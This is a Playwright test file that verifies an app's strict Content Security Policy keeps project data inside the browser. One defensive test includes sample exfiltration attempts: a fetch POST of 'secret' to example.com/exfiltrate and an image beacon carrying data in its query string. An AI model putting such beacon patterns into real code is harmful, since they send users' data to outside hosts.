import { expect, test } from './fixtures';

// FDS section 2: no project data leaves the browser; a strict CSP enforces it.
test.describe('data confidentiality and Content Security Policy', () => {
  test('index.html carries the strict CSP', async ({ app }) => {
    await app.open();
    const csp = await app.page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content');
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("worker-src 'self' blob:");
    expect(csp).toContain("img-src 'self' blob: data:");
    expect(csp).not.toMatch(/https?:/);
  });

  test('every request goes to the app origin and no CSP violation occurs', async ({ app }) => {
    const violations: string[] = [];
    app.page.on('console', (message) => {
      if (/Content Security Policy|Refused to/.test(message.text()))
        violations.push(message.text());
    });
    await app.open();
    await app.page.getByRole('button', { name: /New project/ }).waitFor();
    // Exercise the UI a little so lazily loaded code is fetched too.
    await app.page.reload();
    await app.page.getByRole('button', { name: /New project/ }).waitFor();

    const origin = new URL(app.page.url()).origin;
    const foreign = app.requests
      .map((request) => request.url())
      .filter(
        (url) => !url.startsWith(origin) && !url.startsWith('blob:') && !url.startsWith('data:'),
      );
    expect(foreign).toEqual([]);
    expect(violations).toEqual([]);
  });

  test('the browser blocks requests to third-party origins', async ({ app }) => {
    app.allowForeignRequestAttempts();
    await app.open();
    const result = await app.page.evaluate(async () => {
      const violations: string[] = [];
      document.addEventListener('securitypolicyviolation', (event) =>
        violations.push(event.effectiveDirective),
      );
      let fetchBlocked = false;
      try {
        await fetch('https://example.com/exfiltrate', { method: 'POST', body: 'secret' });
      } catch {
        fetchBlocked = true;
      }
      const img = new Image();
      const imgBlocked = await new Promise<boolean>((resolve) => {
        img.onerror = () => resolve(true);
        img.onload = () => resolve(false);
        img.src = 'https://example.com/pixel.gif?data=secret';
      });
      await new Promise((resolve) => setTimeout(resolve, 100));
      return { fetchBlocked, imgBlocked, violations };
    });
    expect(result.fetchBlocked).toBe(true);
    expect(result.imgBlocked).toBe(true);
    expect(result.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src']));
    // The attempts were blocked in the browser: no response ever came back.
    for (const request of app.requests.filter((r) => r.url().startsWith('https://example.com'))) {
      expect(await request.response()).toBeNull();
    }
  });

  test('the preview server sends the CSP as a header too', async ({ app }) => {
    const response = await app.page.goto('/');
    const header = response?.headers()['content-security-policy'] ?? '';
    expect(header).toContain("connect-src 'self'");
    expect(header).toContain("frame-ancestors 'none'");
  });
});
